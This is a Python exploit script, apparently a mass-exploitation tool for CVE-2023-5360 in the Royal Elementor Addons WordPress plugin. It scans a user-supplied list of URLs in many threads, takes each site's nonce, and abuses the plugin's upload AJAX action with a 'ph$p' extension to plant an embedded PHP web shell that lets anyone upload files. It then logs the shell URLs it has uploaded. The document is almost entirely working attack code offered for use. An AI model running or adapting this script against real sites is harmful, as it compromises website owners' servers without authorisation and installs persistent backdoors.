#!/usr/bin/env python3
# -*- coding=utf-8 -*-
# CVE-2023-5360
# author  = Songroho Islam 

import requests
import re , os
import json
import concurrent.futures
import threading
import asyncio
from random import choice
from string import ascii_lowercase
from platform import system
from concurrent.futures import ThreadPoolExecutor
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
PYTHONWARNINGS = "ignore:Unverified HTTPS request"

php_upload_code = '''
<?php
error_reporting(0);
set_time_limit(0);
echo "<center><b>Uname:".php_uname()."<br></b>"; 
echo '<font color="black" size="4">';
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';
    $mode = '0644';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if(isset($_FILES['image']['name'])) {
        $qx = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod ($qx, octdec($mode));
    echo" <a href=$userfile_name><center><b>Successfully Uploaded :D ==> $userfile_name</b></center></a>";
    }
}else{
    echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center></font>';
?>
'''

def clear():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')


def get_nonce(host_data : str):
    search = r'var WprConfig = {"ajaxurl":"[^"]*","resturl":"[^"]*","nonce":"([^"]+)"'
    match = re.search(search, host_data)
    nonce_value = match.group(1)

    return nonce_value

def save_file(filename, host):
    with open(filename, 'a') as w:
        w.write(f"{host}\n")
        w.close()

def check_vulnerability(host : str):
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
        "Referer": host,  
        }
    try:
        print(f"Checking : {host}")
        req = requests.get(host, headers=headers, timeout = 10 , verify=False ).text
    except Exception as e:
        print(f'An Error {host}')
    else :
        if 'wpr-addons-js-js' in req :
            save_file('active-plugin.txt', host) 
            nonce = get_nonce(req)
            data = {
            'action': 'wpr_addons_upload_file',
            'max_file_size': '0',
            'allowed_file_types': 'ph$p',
            'triggering_event': 'click',
            'wpr_addons_nonce': nonce
            }
            random_name = (''.join(choice(ascii_lowercase) for i in range(7)))
            files = {'uploaded_file': (random_name+'.ph$p', php_upload_code)} # here is  shell script            

            try:
                host_res = requests.post(f"{host}/wp-admin/admin-ajax.php", headers=headers, data=data, files=files,timeout = 10 , verify=False )
            except Exception as e:
                print(f'An Error {host}')
            else :
                if host_res.status_code == 200:
                    try :
                        host_res_json = host_res.json()
                        if host_res_json["success"]:
                            uploaded_shell = host_res_json["data"]["url"]
                            print(f"    Uploaded Shell: {uploaded_shell} ")
                            save_file('exploited.txt', uploaded_shell)
                        else:
                            error_message = host_res_json["data"]["message"]
                            print(f" Upload Error :  {host}")    
                    except json.JSONDecodeError as e:
                        print("Failed to parse json")
                else:
                    print(f" Upload Error :  {host}")
        
        else :
            print(f"Royal elementor addons plugin have not :  {host}")





async def main():
    url_list_name = input('Enter the name of the URL list file: ').strip()
    thrd = int(input('Enter number of thread => '))
    url_list = [each_url for each_url in open(url_list_name, 'r', encoding='utf-8').read().splitlines()]

    loop = asyncio.get_event_loop()
    with ThreadPoolExecutor(max_workers=thrd) as executor:
        await asyncio.gather(*(loop.run_in_executor(executor, check_vulnerability, url) for url in url_list))


if __name__ == "__main__":
    clear()
    print("==> CVE-2023-5360 <==")
    asyncio.run(main())
              
